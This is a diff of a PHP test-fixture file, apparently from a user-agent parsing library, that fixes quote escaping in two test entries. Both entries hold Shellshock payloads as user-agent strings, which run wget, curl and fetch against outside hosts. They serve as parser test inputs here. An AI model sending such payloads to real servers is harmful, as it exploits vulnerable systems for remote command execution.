@@ -1490,7 +1490,7 @@ return [
         ],
     ],
     'test-0003-71' => [
-        'ua'         => '() { :; }; /bin/sh -c \\'wget http://redlug.com/pdf/IWD1990.docx -O /dev/null;wget1 http://redlug.com/pdf/IWD1990.docx -O /dev/null;curl http://redlug.com/pdf/IWD1990.docx -o /dev/null;/usr/sfwbin/wget http://redlug.com/pdf/IWD1990.docx;fetch -/dev/null http://redlug.com/pdf/IWD1990.docx\\'',
+        'ua'         => '() { :; }; /bin/sh -c \'wget http://redlug.com/pdf/IWD1990.docx -O /dev/null;wget1 http://redlug.com/pdf/IWD1990.docx -O /dev/null;curl http://redlug.com/pdf/IWD1990.docx -o /dev/null;/usr/sfwbin/wget http://redlug.com/pdf/IWD1990.docx;fetch -/dev/null http://redlug.com/pdf/IWD1990.docx\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -28922,7 +28922,7 @@ return [
         ],
     ],
     'test-0003-1428' => [
-        'ua'         => '() { :; }; /bin/sh -c \\'wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;wget1 http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;curl http://www.chaparral300.com/src/image/marioarrow.gif -o /dev/null;/usr/sfwbin/wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;fetch -/dev/null http://www.chaparral300.com/src/image/marioarrow.gif\\'',
+        'ua'         => '() { :; }; /bin/sh -c \'wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;wget1 http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;curl http://www.chaparral300.com/src/image/marioarrow.gif -o /dev/null;/usr/sfwbin/wget http://www.chaparral300.com/src/image/marioarrow.gif -O /dev/null;fetch -/dev/null http://www.chaparral300.com/src/image/marioarrow.gif\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
